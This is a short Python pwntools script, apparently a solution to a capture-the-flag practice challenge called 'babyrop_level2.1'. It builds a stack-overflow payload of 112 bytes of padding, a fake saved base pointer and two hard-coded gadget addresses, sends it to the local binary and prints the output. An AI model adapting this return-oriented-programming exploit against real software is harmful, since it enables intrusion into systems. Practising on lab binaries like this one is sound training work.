from pwn import *

payload = b""
payload += b"A" * 112
payload += b"B" * 8 # pop rbp
payload += p64(0x40126d) # pop rsp; rip <- rsp
payload += p64(0x40131a) # pop rsp; rip <- rsp

p = process("./babyrop_level2.1")

p.sendline(payload)

print(p.recvall())
